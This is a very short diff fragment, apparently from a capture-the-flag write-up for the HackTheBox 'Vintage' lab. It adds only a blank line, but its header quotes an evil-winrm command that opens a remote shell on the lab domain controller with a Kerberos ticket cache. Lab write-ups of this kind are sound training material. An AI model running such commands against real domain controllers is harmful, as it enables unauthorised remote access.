@@ -218,3 +218,4 @@ KRB5CCNAME=c.neri.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb
 
 
 
+
